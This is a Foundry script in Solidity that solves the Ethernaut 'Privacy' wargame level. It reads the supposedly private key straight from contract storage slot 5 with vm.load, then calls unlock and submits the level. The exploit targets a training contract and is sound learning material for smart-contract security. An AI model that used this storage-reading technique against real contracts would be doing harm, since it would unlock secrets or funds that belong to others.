// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {console} from "lib/forge-std/src/Script.sol";
import {EthernautScript} from "./Ethernaut.s.sol";

interface Instance {
    function unlock(bytes16 _key) external;

    function locked() external view returns (bool);
}

contract LevelScript is EthernautScript {
    address level = 0xcAac6e4994c2e21C5370528221c226D1076CfDAB;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.startBroadcast(key);
        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function hack() internal {
        bytes16 key = bytes16(vm.load(address(instance), bytes32(uint256(5))));
        instance.unlock(key);
        require(instance.locked() == false);
    }

    function run() public {
        hack();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
//   forge script ./script/12_Privacy.s.sol
